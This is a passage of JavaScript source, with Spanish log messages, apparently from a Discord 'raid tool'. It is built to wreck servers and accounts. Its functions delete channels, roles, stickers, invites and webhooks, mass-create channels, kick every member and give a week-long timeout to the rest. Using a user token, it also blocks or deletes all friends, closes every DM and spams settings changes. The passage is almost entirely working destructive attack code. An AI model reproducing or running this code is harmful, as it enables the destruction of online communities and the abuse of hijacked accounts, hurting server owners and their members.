            });
            console.log(chalk.red(`[-] Abandonado: ${g.name}`));
            await wait_ms(1000);
        }
    } catch (e) { console.log(chalk.red(e.message)); }
}

async function token_block_friends() {
    console.log(chalk.magenta(`[!] Bloqueando amigos...`));
    try {
        const res = await fetch(`https://discord.com/api/v9/users/@me/relationships`, {
            headers: { "Authorization": bot_token }
        });
        const friends = await res.json();
        for (const f of friends) {
            await fetch(`https://discord.com/api/v9/users/@me/relationships/${f.id}`, {
                method: 'PUT',
                headers: { 'Authorization': bot_token, "content-type":"application/json" },
                body: JSON.stringify({ "type": 2 })
            });
            console.log(chalk.red(`[-] Bloqueado: ${f.user.username}`));
            await wait_ms(1500);
        }
    } catch (e) { console.log(chalk.red(e.message)); }
}

async function token_delete_friends() {
    console.log(chalk.magenta(`[!] Eliminando amigos...`));
    try {
        const res = await fetch(`https://discord.com/api/v9/users/@me/relationships`, {
            headers: { "Authorization": bot_token }
        });
        const friends = await res.json();
        for (const f of friends) {
            await fetch(`https://discord.com/api/v9/users/@me/relationships/${f.id}`, {
                method: 'DELETE',
                headers: { 'Authorization': bot_token }
            });
            console.log(chalk.red(`[-] Eliminado: ${f.user.username}`));
            await wait_ms(1500);
        }
    } catch (e) { console.log(chalk.red(e.message)); }
}

async function token_close_mds() {
    console.log(chalk.magenta(`[!] Cerrando DMs...`));
    try {
        const res = await fetch(`https://discord.com/api/v9/users/@me/channels`, {
            headers: { "Authorization": bot_token }
        });
        const dms = await res.json();
        for (const dm of dms) {
            await fetch(`https://discord.com/api/v9/channels/${dm.id}?silent=false`, {
                method: "DELETE",
                headers: { "Authorization": bot_token }
            });
            console.log(chalk.red(`[-] DM cerrado.`));
            await wait_ms(1100);
        }
    } catch (e) { console.log(chalk.red(e.message)); }
}

async function on_logica(guildxd) {
    console.log(chalk.magenta(`[X] Ejecutando comando ON (Destrucción total)...`));
    
    await cambiar_servidor_logica(guildxd);

    await eliminar_canales_logica(guildxd);

    await eliminar_roles_logica(guildxd);

    await crear_canales_masivos(guildxd);
}

async function eliminar_stickers_logica(guildxd) {
    console.log(chalk.magenta(`[-] Eliminando stickers...`));
    const stickers = await guildxd.stickers.fetch();
    let i = 0;
    for (const sticker of stickers.values()) {
        try {
            await sticker.delete();
            i++;
            console.log(chalk.red(`[-] Sticker eliminado: ${sticker.name}`));
        } catch (e) {}
    }
    console.log(chalk.green(`[+] ${i} stickers eliminados.`));
}

async function eliminar_invitaciones_logica(guildxd) {
    console.log(chalk.magenta(`[-] Eliminando invitaciones...`));
    const invites = await guildxd.invites.fetch();
    let i = 0;
    for (const invite of invites.values()) {
        try {
            await invite.delete();
            i++;
            console.log(chalk.red(`[-] Invitación eliminada: ${invite.code}`));
        } catch (e) {}
    }
    console.log(chalk.green(`[+] ${i} invitaciones eliminadas.`));
}

async function eliminar_webhooks_logica(guildxd) {
    console.log(chalk.magenta(`[-] Eliminando webhooks...`));
    const channels = await guildxd.channels.fetch();
    let i = 0;
    for (const ch of channels.values()) {
        if (ch.isTextBased()) {
            try {
                const webhooks = await ch.fetchWebhooks();
                for (const wh of webhooks.values()) {
                    await wh.delete();
                    i++;
                    console.log(chalk.red(`[-] Webhook eliminado: ${wh.name}`));
                }
            } catch (e) {}
        }
    }
    console.log(chalk.green(`[+] ${i} webhooks eliminados.`));
}

async function kickear_todos_logica(guildxd) {
    console.log(chalk.magenta(`[X] Kickeando a todos...`));
    let m_i = 0;
    const members = await guildxd.members.fetch();
    for (const m of members.values()) {
        if (m.kickable) {
            try {
                await m.kick("Raid by Simple Raid Tool");
                m_i++;
                console.log(chalk.red(`[-] Usuario kickeado: ${m.user.tag}`));
            } catch (e) {}
        }
    }
    console.log(chalk.green(`[+] ${m_i} usuarios kickeados.`));
}

async function silenciar_todos_logica(guildxd) {
    console.log(chalk.magenta(`[X] Silenciando a todos (Timeout)...`));
    let m_i = 0;
    const members = await guildxd.members.fetch();
    for (const m of members.values()) {
        if (m.moderatable) {
            try {
                await m.timeout(7 * 24 * 60 * 60 * 1000, "Raid by Simple Raid Tool");
                m_i++;
                console.log(chalk.yellow(`[!] Usuario silenciado: ${m.user.tag}`));
            } catch (e) {}
        }
    }
    console.log(chalk.green(`[+] ${m_i} usuarios silenciados.`));
}

async function token_theme_spam() {
    console.log(chalk.magenta(`[!] Spameando tema...`));
    const themes = ["dark","light","dark","light","dark","light","dark","light"];
    for (const t of themes) {
        try {
            await fetch(`https://discord.com/api/v10/users/@me/settings`, {
                method: "PATCH",
                headers: { "Authorization": bot_token, "Content-Type": "application/json" },
                body: JSON.stringify({ theme: t })
            });
            console.log(chalk.green(`[+] Tema cambiado a ${t}`));
            await wait_ms(1000);
        } catch (e) {}
    }
}

client.login(bot_token).catch(err => {
    if (comando.startsWith('token.')) {
        console.log(chalk.yellow(`[i] Modo Token User: Login de bot fallido (esperado), continuando con operaciones HTTP...`));
        ejecutarComando().catch(e => console.log(e));
    } else {
        console.log(chalk.red(`[X] Error al iniciar sesión: Token inválido o problema de conexión.`));
        process.exit(1);
    }
});
